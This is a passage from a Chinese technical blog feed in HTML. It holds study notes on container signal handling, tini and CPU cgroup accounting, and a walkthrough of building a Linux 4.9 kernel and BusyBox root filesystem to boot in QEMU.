string">&lt;signal.h&gt;</span> </span><span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>sighandler_t<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span> sighandler_t <span class="token function">signal</span><span class="token punctuation">(</span><span class="token keyword">int</span> signum<span class="token punctuation">,</span> sighandler_t handler<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>signum：也就是信号</li><li>handler：函数指针参数，用来注册用户的信号 handler</li></ul></li><li><p>进程对信号的<strong>忽略</strong>处理：通过 signal() 系统调用为这个信号注册一个特殊的 handler，也就是 <code>SIG_IGN</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token function">signal</span><span class="token punctuation">(</span>SIGTERM<span class="token punctuation">,</span> SIG_IGN<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序运行的时候，如果收到 SIGTERM 信号，程序会什么反应也没有</p></li><li><p>SIGKILL 和 SIGSTOP 信号是两个<strong>特权信号</strong>，它们不可以被捕获和忽略，这个特点也反映在 signal() 调用上，如果用 signal() 为 SIGKILL 注册 handler，那么就会返回 <code>SIG_ERR</code></p></li></ul><h5 id="解决问题-2">解决问题</h5><ul><li><p>当 Linux 进程收到 SIGTERM 信号并且使进程退出，这时 Linux 内核对处理进程退出的入口点就是 <code>do_exit()</code> 函数，函数会释放进程的相关资源（比如内存，文件句柄，信号量），然后会调用 <code>exit_notify()</code> 函数用来通知和这个进程相关的父子进程等</p></li><li><p>对于容器来说，还要考虑 Pid Namespace 里的其他进程，就会调用 <code>zap_pid_ns_processes()</code> 函数，在这个函数中，如果是处于退出状态的 init 进程，它会向 Namespace 中的其他进程都发送一个 SIGKILL 信号</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220427-docker-kill-init.png" alt=""></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">zap_pid_ns_processes</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pid_namespace</span> <span class="token operator">*</span>pid_ns<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token function">read_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tasklist_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>nr <span class="token operator">=</span> <span class="token function">next_pidmap</span><span class="token punctuation">(</span>pid_ns<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>nr <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">rcu_read_lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>task <span class="token operator">=</span> <span class="token function">pid_task</span><span class="token punctuation">(</span><span class="token function">find_vpid</span><span class="token punctuation">(</span>nr<span class="token punctuation">)</span><span class="token punctuation">,</span> PIDTYPE_PID<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>task <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">__fatal_signal_pending</span><span class="token punctuation">(</span>task<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">send_sig_info</span><span class="token punctuation">(</span>SIGKILL<span class="token punctuation">,</span> SEND_SIG_FORCED<span class="token punctuation">,</span> task<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">rcu_read_unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>nr <span class="token operator">=</span> <span class="token function">next_pidmap</span><span class="token punctuation">(</span>pid_ns<span class="token punctuation">,</span> nr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">read_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tasklist_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span>        <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>解决的方法就是在容器的 init 进程中对收到的信号做<strong>转发</strong>，发送到容器中的其他子进程，这样容器中的所有进程在停止时，都会收到 SIGTERM，而不是 SIGKILL 信号了</p></li><li><p>Docker Container 里使用的 tini 作为 init 进程，tini 的代码中就会调用 <code>sigtimedwait()</code> 函数来查看自己收到的信号，然后调用 kill() 把信号发给子进程</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">wait_and_forward_signal</span><span class="token punctuation">(</span>sigset_t <span class="token keyword">const</span><span class="token operator">*</span> <span class="token keyword">const</span> parent_sigset_ptr<span class="token punctuation">,</span> pid_t <span class="token keyword">const</span> child_pid<span class="token punctuation">)</span> <span class="token punctuation">{</span>siginfo_t sig<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sigtimedwait</span><span class="token punctuation">(</span>parent_sigset_ptr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sig<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ts<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>errno<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token comment">/* There is a signal to handle here */</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>sig<span class="token punctuation">.</span>si_signo<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">case</span> SIGCHLD<span class="token operator">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// 除了 SIGCHLD 这个信号外</span><span class="token keyword">default</span><span class="token operator">:</span> <span class="token comment">// 把其他所有的信号都转发给它的子进程</span><span class="token function">PRINT_DEBUG</span><span class="token punctuation">(</span><span class="token string">"Passing signal: '%s'"</span><span class="token punctuation">,</span> <span class="token function">strsignal</span><span class="token punctuation">(</span>sig<span class="token punctuation">.</span>si_signo<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* Forward anything else */</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">kill</span><span class="token punctuation">(</span>kill_process_group <span class="token operator">?</span> <span class="token operator">-</span>child_pid <span class="token operator">:</span> child_pid<span class="token punctuation">,</span> sig<span class="token punctuation">.</span>si_signo<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>errno <span class="token operator">==</span> ESRCH<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">PRINT_WARNING</span><span class="token punctuation">(</span><span class="token string">"Child was dead when forwarding signal"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token function">PRINT_FATAL</span><span class="token punctuation">(</span><span class="token string">"Unexpected error when forwarding signal: '%s'"</span><span class="token punctuation">,</span> <span class="token function">strerror</span><span class="token punctuation">(</span>errno<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>为了保证子进程先收到转发的SIGTERM，tini 自己不退出，子进程收到 SIGTERM 退出之后会给父进程发送 <code>SIGCHILD</code>，tini 收到 SIGCHILD 之后主动整个程序退出</p></li></ul><h4 id="小结-2">小结</h4><ul><li>容器里的 init 进程应该具备这些信号处理的能力：<ul><li>至少转发 SIGTERM 给容器里其他的关键子进程</li><li>能够接受到外部的 SIGTERM 信号而退出（可以是通过注册 SIGTERM handler，也可以先转发 SIGTERM 给子进程，然后收到 SIGCHILD 后自己主动退出）</li><li>具有回收 zombie 进程的能力</li></ul></li></ul><h3 id="容器-CPU">容器 CPU</h3><h4 id="怎么限制容器的-CPU-使用？">怎么限制容器的 CPU 使用？</h4><blockquote><p>以 Kubernetes 平台为例，在 Pod Spec 中的 <code>Request CPU</code> 和 <code>Limit CPU</code> 的值，会通过 CPU Cgroup 的配置来实现控制容器 CPU 资源的作用，Limit CPU 为容器设置可用 CPU 的上限，Request CPU 是容器可以保证获得需要的 CPU 数目</p></blockquote><h5 id="CPU-使用的分类">CPU 使用的分类</h5><ul><li><p>运行 top 命令，<code>%Cpu(s)</code> 这行显示的就是 cpu usage，是容器宿主机的 CPU 使用率</p><pre class="line-numbers language-none"><code class="language-none">%Cpu(s):  1.2 us,  0.8 sy,  0.0 ni, 97.5 id,  0.5 wa,  0.0 hi,  0.0 si,  0.0 st<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220428-cpu-usage-chart.png" style="zoom: 50%;"><ul><li><code>us</code>（user）代表用户态 CPU 使用</li><li><code>sy</code>（system）代表内核态 CPU 使用，程序中调用了系统调用，进程就会切换到内核态，这些代码指令的消耗就属于 sy</li><li><code>wa</code>（iowait）代表等待 I/O 的时间，这里的 I/O 是指 Disk I/O，进程在磁盘 IO 操作时一般会被置为不可中断睡眠态，Linux 会把这段时间标示成 wa</li><li><code>id</code>（idle）代表系统处于空闲状态，用户进程都处于休眠，这时在这个 CPU 上没有需要运行的进程</li><li><code>hi</code>（hardware irq）代表 CPU 处理硬中断的开销</li><li><code>si</code>（softirq）代表 CPU 处理软中断的开销，软中断可以完成这些耗时比较长的工作</li><li><code>ni</code>（nice）如果进程的 nice 值是正值（1-19），代表优先级比较低的进程运行时所占用的 CPU</li><li><code>st</code>（steal）是在虚拟机里用的一个 CPU 使用类型，表示有多少时间是被同一个宿主机上的其他虚拟机抢走的</li></ul></li><li><p>进程 CPU 使用只包含两部分：用户态（us ni）和内核态（sy）</p></li></ul><h5 id="进程和系统-CPU-使用率">进程和系统 CPU 使用率</h5><ul><li><p>每个进程在 top 命令输出中都有对应的一行，%CPU 那一列就是这个进程的实时 CPU 使用率，对于每个进程 top 都会从 proc 文件系统中每个进程对应的 stat 文件（<code> /proc/[pid]/stat</code>）中读取 2 个数值</p><ul><li>stat 文件实时输出了进程的状态信息，比如进程的运行态、父进程 PID、进程优先级、进程使用的内存等（<a href="https://man7.org/linux/man-pages/man5/proc.5.html">stat 文件内容和格式</a>）</li><li>（14）<code>utime</code> 表示进程的用户态部分在 Linux 调度中获得 CPU 的 ticks（ticks 是 Linux 中的一个时间单位；每次时钟中断都会触发内核做一次进程调度，而这一次中断就是一个 tick）</li><li>（15）<code>stime</code> 表示进程的内核态部分在 Linux 调度中获得 CPU 的 ticks</li></ul></li><li><p>计算<strong>进程 CPU 使用率</strong><br>$$<br>\frac{((utime_2 – utime_1) + (stime_2 – stime_1))\cdot 100.0}{HZ \cdot et \cdot 1}<br>$$</p><blockquote><p>HZ：1 秒钟里 ticks 的次数，这里值是100（USER_HZ）</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220910-HZ.png" alt=""></p><p>et：瞬时的时间，也就是得到 $utime_1$ 和 $utime_2$ 这两个值的时间间隔</p><p>1：1 个 CPU<br>$$<br>\frac{进程 ticks}{单个 CPU 总 ticks}\times 100.0<br>$$</p></blockquote></li><li><p>读取 <code>/proc/stat</code> 文件，其中 cpu 行有 10 列数据，前 8 列数据对应 top 输出中 <code>%Cpu(s)</code>，每一项的数值就是系统自启动开始的 <code>ticks</code>；此文件是整个节点全局的状态文件</p></li><li><p>瞬时各项 CPU 使用率的 ticks 相加得到一个总值，单项值除以总值就是各项 CPU 的使用率</p></li></ul><h5 id="CPU-Cgroup">CPU Cgroup</h5><ul><li><p>CPU Cgroup 是一个 Cgroups 子系统，用来限制进程的 CPU 使用，CPU Cgroup 不会限制 wa、hi、si 这些 I/O 或者中断相关的 CPU 使用</p></li><li><p>Cgroups 子系统都是通过一个虚拟文件系统挂载点的方式，挂到一个缺省的目录下；CPU Cgroup 一般在 Linux 里会放在 <code>/sys/fs/cgroup/cpu</code> 目录下，在这个子系统的目录下，每个控制组（Control Group） 都是一个子目录，各个控制组之间的关系就是一个树状的层级关系</p></li><li><p>CFS 相关的参数</p><ul><li><p><code>cpu.cfs_period_us</code> 是 CFS 算法的一个调度周期</p><ul><li>一般它的值是100000，以 microseconds 为单位，即 100ms</li></ul></li><li><p><code>cpu.cfs_quota_us</code> 表示 CFS 算法中，在一个调度周期里这个控制组被允许的运行时间，如果用这个值去除以调度周期就是这个控制组被允许使用的 CPU 最大配额</p><ul><li>比如这个值为 50000 时，就是 50ms，$50ms/100ms = 0.5$，这个控制组被允许使用的 CPU 最大配额是 0.5 个 CPU</li></ul></li><li><p><code>cpu.shares</code> 是 CPU Cgroup 对于控制组之间的 CPU 分配比例，它的缺省值是 1024，只有当系统上 CPU 完全被占满的时候，这个比例才会在各个控制组间起作用</p></li></ul><blockquote><p>云平台中大部分程序都不是实时调度的进程，而是普通调度（SCHED_NORMAL）类型进程，普通调度的算法在 Linux 中目前是 CFS （Completely Fair Scheduler，完全公平调度器）</p></blockquote></li></ul><h4 id="如何正确地拿到容器-CPU-的开销？">如何正确地拿到容器 CPU 的开销？</h4><ul><li><p>top 只能显示整个节点中各项 CPU 的使用率，不能显示单个容器的各项 CPU 的使用率</p></li><li><p>CPU Cgroup 控制组有一个可读项 <code>cpuacct.stat</code>，其中有两个统计值：这个控制组里所有进程的内核态 ticks 和用户态的 ticks；因此可以用计算进程 CPU 使用率的公式去计算整个容器的 CPU 使用率</p></li><li><p>示例：容器的 CPU 使用率是 $\frac{((48844 - 48647) + (88 - 88)) \times 100.0}{(100 \times 1 \times 1)} = 197%$</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220910-container-cpu-usage.png" alt=""></p></li></ul><h4 id="Load-Average">Load Average</h4><blockquote><p>场景：有时明明容器里所有进程的 CPU 使用率都很低，甚至整个宿主机的 CPU 使用率都很低，而机器的 Load Average 里的值却很高，容器里进程运行得也很慢</p></blockquote><ul><li><p>上世纪 70 年代，早期的 Unix 系统上就已经有了 Load Average，<a href="https://www.ietf.org/rfc/rfc546.html#ref-1">RFC546</a> 上定义了 Load Average 是一种 <strong>CPU 资源需求的度量</strong></p></li><li><p>不论 CPU 是空闲还是满负载，Load Average 是 Linux 进程调度器中可运行队列（Running Queue）里的一段时间的平均进程数目；CPU 还有空闲的情况下，CPU Usage 可以直接反映到 Load Average；CPU 满负载的情况下，Load Average 就不能和 CPU Usage 等同了</p></li><li><p>对于 Linux 的 Load Average，除了可运行队列中的进程数目，等待队列中的 <code>TASK_UNINTERRUPTIBLE</code> 进程数目也会增加 Load Average（可运行队列进程平均数 + 休眠队列中不可打断的进程平均数）</p><blockquote><p>开发者 <em>Matthias</em> 认为 Load Average 如果只考虑进程运行队列中需要被调度的进程或线程平均数目是不够的，因为对于处于 I/O 资源等待的进程都是处于 TASK_UNINTERRUPTIBLE 状态的；他给内核加一个补丁，把处于不可中断睡眠状态的进程数目也计入了 Load Average（1993）</p></blockquote></li><li><p>无法通过 CPU Cgroup 来控制 Load Average 的平均负载，而没有这个限制就会影响系统资源的合理调度，很可能导致系统变慢，因为 Cgroups 更多的是以进程为单位进行隔离，而 D 状态进程是内核中系统全局资源引入的；可以在容器宿主机的节点对 D 状态进程做监控，定向分析解决</p></li></ul><hr><p>参考资料：</p><ul><li><p><a href="https://man7.org/linux/man-pages/man7/cgroups.7.html">Linux Programmer’s Manual</a> 中 Cgroups 的定义</p></li><li><p><a href="https://blog.csdn.net/bin_linux96/article/details/100917831">Linux cgroup源码分析</a></p></li><li><p><a href="https://moelove.info/2021/11/17/%E4%B8%80%E7%AF%87%E6%90%9E%E6%87%82%E5%AE%B9%E5%99%A8%E6%8A%80%E6%9C%AF%E7%9A%84%E5%9F%BA%E7%9F%B3-cgroup/">一篇搞懂容器技术的基石</a></p></li><li><p><a href="https://www.jianshu.com/p/f445bfeea40a">Linux 信号</a></p></li><li><p><a href="https://github.com/krallin/tini">Tini</a>：A tiny but valid init for containers</p></li><li><p><a href="https://tobegit3hub1.gitbooks.io/understanding-linux-processes/content/index.html">理解Linux进程</a></p></li><li><p><a href="https://plpan.github.io/docker-exec-%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5%E4%B9%8B%E6%97%85/">docker exec 失败问题排查</a></p></li><li><p>cpu usage 一览表</p></li></ul>  <img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220428-cpu-usage.png" style="zoom: 50%;"><ul><li><p><a href="https://github.com/lxc/lxcfs">lxcfs</a> 可以为每个容器虚拟一些 <code>/proc</code> 下的文件，比如 <code>/proc/stat</code></p></li><li><p>知识点总结</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220407-container.png" alt=""></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 容器 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 内核开发</title>
      <link href="2021/11/19/linux-kernel/"/>
      <url>2021/11/19/linux-kernel/</url>
      
        <content type="html"><![CDATA[<h2 id="01-编译Linux4-9内核并运行">01 | 编译Linux4.9内核并运行</h2><ul><li><p><a href="https://mirrors.edge.kernel.org/pub/linux/kernel">Linux 源码下载</a></p></li><li><p><a href="https://www.kernel.org/doc/html/latest/translations/zh_CN/index.html">Kernel Documentation</a></p></li><li><p>Linux内部全景图</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220711-linux-kernel-map.png" style="zoom:50%;"></li></ul><h3 id="内核源码目录">内核源码目录</h3><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211031-linuxkernel.png" alt="linux内核源码目录"></p><ul><li>arch：内核支持的CPU体系架构，例如arm/mach-omap1，即ti公司的soc，此soc的cpu核是ARM提供</li><li>firmware：固件相关</li><li>init：内核启动相关代码<ul><li>main.c：start_kernel() 是C语言代码入口</li><li>do_mounts*：内核启动后挂载文件系统</li></ul></li><li>drivers：驱动框架代码，例如i2c，dma， leds</li><li>fs：文件系统代码</li><li>ipc：进程通讯相关</li><li>net：网络协议栈相关</li><li>kernel：内核核心代码<ul><li>注意和arm/kernel目录的区别（arm体系相关），kernel目录会调用arm/kernel</li></ul></li><li>sound：声卡相关</li><li>crypto：加解密相关</li><li>include：内核头文件</li><li>lib：通用库</li><li>mm：内存管理相关</li></ul><br><h3 id="编译内核">编译内核</h3><ol><li><p>指定硬件体系架构</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">ARCH</span><span class="token operator">=</span>x86<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果要编译arm的内核，则指定ARCH=arm且需要安装交叉编译器</p></li><li><p>配置board config</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> x86_64_defconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>配置内核</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> menuconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211031-LinuxConfigurationMenu.png" alt="Linux配置菜单"></p><p>这一步是对第2步的菜单进行微调，我们需要内核支持ramdisk驱动，需要选中如下配置：</p><pre class="line-numbers language-none"><code class="language-none">General setup  ---&gt;[*] Initial RAM filesystem and RAM disk (initramfs/initrd) supportDevice Drivers  ---&gt;  [*] Block devices  ---&gt;&lt;*&gt;   RAM block device support(65536) Default RAM disk size (kbytes)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>报错</strong>：curses.h：No such file or directory（<code>apt-get install libncurses5-dev libncursesw5-dev</code>）</p></li><li><p>编译内核</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编译成功后的内核位于：arch/x86_64/boot/bzImage</p><blockquote><p><strong>vmlinux</strong>：是内核源码编译出来的原始ELF格式文件，未经压缩。用于kernel-debug，产生system.map符号表，不能用于直接加载，不可以作为启动内核，只是启动过程中的中间媒体</p><p><strong>bzImage</strong>：是压缩的内核镜像文件，bz表示"big zImage"，两者的不同之处在于zImage解压缩内核到低端内存（第一个640K），bzImage解压缩内核到高端内存（1M以上）。如果内核比较大应该用bzImage，比zImage有更高的压缩率</p></blockquote></li><li><p>交叉编译器</p><p>交叉编译工具链的命名规则一般为：<code>$arch [-$vendor] -$os [-[gnu][eabi][hf]]-gcc</code></p><ul><li>arch：体系架构，不可省略</li><li>vendor：工具链提供商，可省略</li><li>os：目标操作系统，不可省略</li><li>eabi：嵌入式应用二进制接口（Embedded Application Binary Interface），可选的参数包括：<ul><li>abi：二进制应用接口</li><li>eabi：嵌入式二进制应用接口，主要针对嵌入式平台</li><li>gnu：表示编译器使用gnu glibc库</li><li>el：表示使用软浮点处理单元（softfp）</li><li>hf：表示使用硬件浮点处理单元（hard）</li></ul></li></ul><p>例如：</p><ul><li>arm-linux-gcc：针对arm的linux的交叉编译器</li><li>arm-linux-gnueabi-gcc：针对arm的linux的交叉编译器，使用gnu glibc库</li></ul></li></ol><h3 id="编译文件系统">编译文件系统</h3><p><a href="https://busybox.net/downloads/">buysbox源码下载</a></p><ol><li><p>配置buysbox源码</p><p>busybox配置为静态编译，busybox在运行的时候就不需要额外的动态链接库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> menuconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Busybox Settings  ---&gt;   Build Options  ---&gt;[*] Build BusyBox as a static binary (no shared libs)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>编译和安装</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编译完成后的busybox安装在源码根目录下的_install目录</p><p><strong>报错</strong>：stime 函数未定义（<a href="https://git.busybox.net/busybox/commit/?id=d3539be8f27b8cbfdfee460fe08299158f08bcd9">Remove stime function calls</a>）</p></li><li><p>进入_install目录，补充一些必要的文件或目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> etc dev mnt proc sys tmp<span class="token function">mkdir</span> -p etc/init.d/<span class="token function">vim</span> etc/fstab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">proc/procprocdefaults00tmpfs/tmptmpfsdefaults00sysfs/syssysfsdefaults00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> etc/init.d/rcS<span class="token function">chmod</span> <span class="token number">755</span> etc/init.d/rcS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">echo -e "Welcome to tinyLinux"/bin/mount -a# 挂载etc/fstab中的文件系统echo -e "Remounting the root filesystem"mount  -o  remount,rw  /# 根文件系统从重新挂载一次mkdir -p /dev/ptsmount -t devpts devpts /dev/ptsecho /sbin/mdev &gt; /proc/sys/kernel/hotplug# 处理热插拔mdev -s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> etc/inittab<span class="token function">chmod</span> <span class="token number">755</span> etc/inittab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">::sysinit:/etc/init.d/rcS::respawn:-/bin/sh::askfirst:-/bin/sh::ctrlaltdel:/bin/umount -a -r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> dev<span class="token function">mknod</span> console c <span class="token number">5</span> <span class="token number">1</span><span class="token function">mknod</span> null c <span class="token number">1</span> <span class="token number">3</span><span class="token function">mknod</span> tty1 c <span class="token number">4</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>一个最小的、完整的可以被内核启动的文件系统就完成了</p><p><a href="https://www.cnblogs.com/schips/p/12125736.html">BusyBox 添加自定义命令/小程序</a></p></li></ol><h3 id="制作根文件系统镜像文件">制作根文件系统镜像文件</h3><ol><li><p>先制作一个空的镜像文件</p></li><li><p>然后把此镜像文件格式化为ext3格式</p></li><li><p>然后把此镜像文件挂载，并把根文件系统复制到挂载目录</p></li><li><p>卸载该镜像文件</p></li><li><p>打成gzip包</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token function">rm</span> -rf rootfs.ext3<span class="token function">rm</span> -rf fs<span class="token function">dd</span> <span class="token assign-left variable">if</span><span class="token operator">=</span>/dev/zero <span class="token assign-left variable">of</span><span class="token operator">=</span>./rootfs.ext3 <span class="token assign-left variable">bs</span><span class="token operator">=</span>1M <span class="token assign-left variable">count</span><span class="token operator">=</span><span class="token number">32</span>mkfs.ext3 rootfs.ext3<span class="token function">mkdir</span> fs<span class="token function">mount</span> -o loop rootfs.ext3 ./fs<span class="token function">cp</span> -rf ./_install/* ./fs<span class="token function">umount</span> ./fs<span class="token function">gzip</span> --best -c rootfs.ext3 <span class="token operator">&gt;</span> rootfs.img.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终生成的文件系统镜像名字为：rootfs.img.gz</p></li></ol><h3 id="启动内核和文件系统">启动内核和文件系统</h3><ol><li><p>安装qemu</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu-system-x86<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>通过qemu模拟器启动编译好的内核和文件系统镜像</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-system-x86_64 -kernel ./linux-4.9.229/arch/x86_64/boot/bzImage  -initrd ./busybox-1.30.0/rootfs.img.gz -append <span class="token string">"root=/dev/ram init=/linuxrc"</span> -serial file:output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211031-qemu.png" alt=""></p><blockquote><p>qemu取回鼠标 Ctrl + Alt + G</p></blockquote></li></ol><h3 id="Linux内核源码编译过程">Linux内核源码编译过程</h3><ol><li><p>顶层Makefile文件</p><p>包含体系相关Makefile文件</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">SRCARCH <span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span>ARCH<span class="token punctuation">)</span> <span class="token comment">#export ARCH=x86指定</span><span class="token keyword">include</span> arch/<span class="token variable">$</span><span class="token punctuation">(</span>SRCARCH<span class="token punctuation">)</span>/Makefile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>内核中的子目录，编译系统去子目录下递归地调用Makefile文件</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">init-y<span class="token operator">:=</span> init/drivers-y<span class="token operator">:=</span> drivers/ sound/ firmware/net-y<span class="token operator">:=</span> net/libs-y<span class="token operator">:=</span> lib/core-y<span class="token operator">:=</span> usr/virt-y<span class="token operator">:=</span> virt/<span aria-hidden="true" 